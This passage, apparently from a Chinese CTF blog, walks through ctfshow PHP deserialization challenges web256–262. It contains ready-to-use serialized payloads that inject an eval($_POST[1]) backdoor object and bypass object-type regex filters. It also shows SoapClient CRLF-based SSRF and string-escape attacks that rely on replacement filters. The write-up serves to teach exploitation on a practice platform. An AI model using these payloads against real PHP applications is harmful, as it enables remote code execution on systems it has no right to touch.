class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>源码</p><p><img src="../images/image-20230104221218372.png" alt="image-20230104221218372"></p><p>这里终于遇到了反序列化函数了   </p><p>这里介绍一下construct和destruct函数，学过c++语言的应该都知道这两个函数</p><p>construct —&gt;  就是在new 一个新的对象的时候会自动运行的函数，如果class类中没有的话，系统就会自己新创一个，但里面没有任何东西。</p><p>destruct —&gt;   就是在一个类运行结束的时候，会自动运行的函数。</p><p><strong><img src="../images/image-20230104222641078.png" alt="image-20230104222641078"></strong></p><p><img src="../images/image-20230104222655281.png" alt="image-20230104222655281"></p><p>就是先输出a,在输出b.</p><p>回到这道题</p><p>这里把__construct 函数里的info改成backDoor，因为在new一个ctfShowUser的新对象时，会自动执行construct函数。就会new一个backDoor的新对象，然后ctfShowUser类结束的时候会自动执行destruct函数，然后就会调用到backDoor类里边的getInfo函数，里面的函数有一个命令执行，然后就利用这一点进行rce了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br></pre></td></tr></table></figure><p>然后自己进行rce就行。</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>源码</p><p><img src="../images/image-20230104223933413.png" alt="image-20230104223933413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure><p>可以看对序列化的字符串进行了过滤，其实主要过滤的就是禁止<code>Object</code>类型被反序列化。虽然这样看起是没有问题的，但是由于PHP的一个BUG，导致仍然可以被绕过。只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。</p><p>这个漏洞是php5.6.24版本才进行修复.</p><p>修复后—&gt;  <code>/[oc]:[^:]*\d+:/i</code>    这里的话用+已经不能绕过了。</p><p>第一步</p><p>（进行修改）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>第二步</p><p>（urlencode)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new ctfShowUser());</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后进行rce就行了。</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>源码</p><p><img src="../images/image-20230104232501397.png" alt="image-20230104232501397"></p><p><img src="../images/image-20230104232508253.png" alt="image-20230104232508253"></p><p>这道题利用的是序列化的ssrf性质</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。必须调用SoapClient不存在的方法，触发SoapClient的<strong>__call魔术方法</strong>。通过CRLF来添加请求体：SoapClinet可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容。</p><p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，采用了SOAP协议（SOAP是一种简单的基于XML的协议，它使应用程序通过HTTP来交换信息），其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会调用__call方法，具体详细信息，感兴趣的读者可以自行查阅，这里不进行赘述</p><p>CRLF是”回车 + 换行”（rn）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p><p>在多数CTF题目中，会将这两个知识点结合起来考察。</p><p><strong>首先</strong></p><p><img src="../images/image-20230105181930658.png" alt="image-20230105181930658"></p><p><img src="../images/image-20230105181617490.png" alt="image-20230105181617490"></p><p>我们创建对象的时候设置的参数‘uri’SOAPction，‘location’具体表现在POST和Host。 我们还可以控制参数User-Agent，通过创建对象的时候添加参数’user_agent’=&gt;$u</p><p>Content-Type 和 Content-Length 也是我们可以控制的地方。</p><p><strong>开始伪造http头</strong></p><p><img src="../images/image-20230105182603050.png" alt="image-20230105182603050"></p><p><img src="../images/image-20230105182753522.png" alt="image-20230105182753522"></p><p>成功写入，那么就开始根据题目的要求来写入token.</p><p><img src="../images/image-20230105183131849.png" alt="image-20230105183131849"></p><p>根据题目要求写入的token和X-Forwarded-For</p><p>这里要求的<code>Content-Length:13</code>是因为伪造的http头，只需要执行到token=ctfshow就行。token=ctfshow长度为13.</p><p><img src="../images/image-20230105183531826.png" alt="image-20230105183531826"></p><p>执行成功。</p><p>因为题目的服务器端口是80，所以我们得把9999给去掉。</p><p><img src="../images/image-20230105184013157.png" alt="image-20230105184013157"></p><p><img src="../images/image-20230105184100591.png" alt="image-20230105184100591"></p><p>拿到编码的东西后进行传参。</p><p>然后访问flag.txt就行了。</p><p>这道题主要就是通过ua来构造http头来绕过检测。</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>源码</p><p><img src="../images/image-20230105174655881.png" alt="image-20230105174655881"></p><p>这个点就考察serialize，只要传的之里面有<code>ctfshow_i_love_36D</code>就行了。</p><p><img src="../images/image-20230105174843961.png" alt="image-20230105174843961"></p><p>序列化后的结果。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>源码</p><p><img src="../images/image-20230105175010366.png" alt="image-20230105175010366"></p><p>这里边用的全是魔术方法</p><p>php7.4版本以上的话这里面的话如果有__unserialize()魔术方法的话，会自动绕过 ,wakeup()魔术方法，php5.6版本以下的话，可以通过修改类里边的参数的数量来绕过wakeup方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;   <span class="comment">//对象创建时会自动调用。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用unserialize时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用serialize时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; <span class="comment">//检查是否存在具有名为 __unserialize() 的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//对象被销毁时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p><img src="../images/image-20230105211617857.png" alt="image-20230105211617857"></p><p>那么这道题的话，只需要用两个魔法函数就行了，这里边的wakeup函数不用管了，因为就是题目的php版本是7.4以上的。invoke()函数也不用管了，因为就是没有触发的点.现在就是看sleep函数了，在serialize时就会触发，给username和password给赋值了。unserialize函数会传递从 __serialize() 返回的恢复数组，那么又会给username和password重新赋值了。因为code这里时弱类型比较，直接877.xxxxxxxx就可以绕过了。</p><p>然后去访问877.php去进行rce就行了。</p><h2 id="web262-字符逃逸"><a href="#web262-字符逃逸" class="headerlink" title="web262(字符逃逸)"></a>web262(字符逃逸)</h2><p>源码</p><p><img src="../images/image-20230105212728740.png" alt="image-20230105212728740"></p><p>先解释一下啥时字符逃逸</p><p><strong>逃逸有一个特征就是对序列化后的字符进行一个替换</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;vip=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$u_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="variable">$us</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$u_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$us</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230105222856799.png" alt="image-20230105222856799"></p><p><strong>这里的话就会出现hacker的长度为5，那么r就逃逸出去了。</strong></p><p>接下来我们想办法把vip变成1.</p><p><img src="../images/image-20230105223446392.png" alt="image-20230105223446392"></p><p>那我们要把vip变成1，且能进行逃逸的话，红线的””内的值要和外面的长度相等就能进行逃逸了。</p><p><img src="../images/image-20230105223548683.png" alt="image-20230105223548683"></p><p>因为我们的payload的长度时45,那么我们就得用45个admin来替换。因为我们的admin和hacker相差一个字符，那么45个字符的话，就可以把上图选中的payload给代替掉，那么我们就可以使其和引号里的值和外面的字符长度一样了   —&gt;  s:2:”xx”   就是类似这种。</p><p><img src="../images/image-20230105224157993.png" alt="image-20230105224157993"></p><p>刚好等于270，逃逸成功，vip也成功写入，当然了就是只看{}里面的内容，超出之后的东西系统不管了。</p><p>讲明白逃逸之后，回到本题。</p><p><img src="../images/image-20230105225632889.png" alt="image-20230105225632889"></p><p>成功逃逸有个字符，那么就跟上面讲解的逃逸的步骤一步一步来就可以解出来了。</p><p><img src="../images/image-20230105225924163.png" alt="image-20230105225924163"></p><p>payload一共有62个字符，那么我们就得去写62个fuck了，这里不知道原因的可以去上面看我写的解释。</p><p><img src="../images/image-20230105230112556.png" alt="image-20230105230112556"></p><p>刚刚好相等，然后进行base64编码后拿去提交。就可以拿到flag了。</p><p><img src="../images/image-20230105230520473.png" alt="image-20230105230520473"></p><p><strong>解法二</strong></p><p><img src="../images/image-20230105230809582.png" alt="image-20230105230809582"></p><p>修改一下token直接就可以进行反序列了。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    